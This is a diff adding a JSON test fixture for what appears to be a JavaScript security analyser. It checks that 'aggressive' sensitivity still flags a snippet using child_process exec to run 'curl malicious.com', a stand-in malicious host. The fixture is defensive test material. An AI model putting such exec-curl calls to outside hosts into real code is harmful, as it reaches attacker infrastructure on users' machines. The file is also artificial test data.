@@ -1,0 +1,7 @@
+{
+  "name": "aggressive mode: should still detect curl command",
+  "code": "\n      const { exec } = require(\"child_process\");\n      exec(\"curl malicious.com\");\n    ",
+  "analyserOptions": {
+    "sensitivity": "aggressive"
+  }
+}
